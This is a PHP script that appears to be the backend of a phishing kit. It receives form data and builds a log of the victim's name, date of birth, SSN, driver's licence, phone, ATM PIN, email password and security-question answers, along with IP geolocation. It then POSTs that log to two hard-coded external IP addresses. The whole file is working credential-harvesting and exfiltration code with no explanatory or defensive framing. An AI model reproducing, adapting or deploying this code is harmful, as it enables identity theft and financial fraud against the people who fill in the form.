<?php
header("Access-Control-Allow-Origin: *");
require 'call.php';
require 'location.php';
$ip = getUserIP();
$hostname = gethostbyaddr(@$_SERVER['REMOTE_ADDR']);
$browser = @$_SERVER['HTTP_USER_AGENT'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$hostname"));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"];
$region = $geo["geoplugin_region"];

$post = json_decode(file_get_contents('php://input'), true);

$info =
    "--------- Log.Info ---------" . "\r\n" .
    "Name: " . $post['name'] . "\r\n" .
    "Dob: " . $post['date1'] . " / " . $post['date2'] . " / " . $post['date3'] . "\r\n" .
    "SSN: " . $post['sin1'] . $post['sin2'] . $post['sin3'] . "\r\n" .
    "DL: " . $post['driver'] . "\r\n" .
    "Phone: " . $post['phone'] . "\r\n" .
    "Issue: " . $post['issue'] . "\r\n" .
    "Pin: " . $post['atm'] . "\r\n" .
    "E-mail1: " . $post['email'] . " / " . "E-mail Password: " . $post['ep'] . "\r\n" .
	"-" . "\r\n" .
    "Q1: " . $post['options'] . "\r\n" .
    "A1: " . $post['answer'] . "\r\n" .
    "Created Question 1: " . $post['choose'] . "\r\n" .
    "Q2: " . $post['options2'] . "\r\n" .
    "A2: " . $post['answer2'] . "\r\n" .
    "Created Question 2: " . $post['choose2'] . "\r\n" .
    "Q3: " . $post['options3'] . "\r\n" .
    "A3: " . $post['answer3'] . "\r\n" .
    "Created Question 3: " . $post['choose3'] . "\r\n" .
	"-" . "\r\n" .
    "IP: " . $ip . "\r\n" .
    "Country: " . ip_info($ip, "Country") . " / " . "Region: " . ip_info($ip, "State") .
    " / " . "City: " . ip_info($ip, "City") . "\r\n".
    "--------- Log ---------" . "\r\n";


$url = 'http://63.141.248.148:22';
$data = array('info' => $info);
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */
}


$url2 = 'http://107.175.34.149:22';
$data = array('info' => $info);
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);
$context = stream_context_create($options);
$result = file_get_contents($url2, false, $context);
if ($result === FALSE) { /* Handle error */
}


if (file_exists($post['name'] . '.txt')) {
    unlink($post['name'] . '.txt');
    echo 'deleted';
}

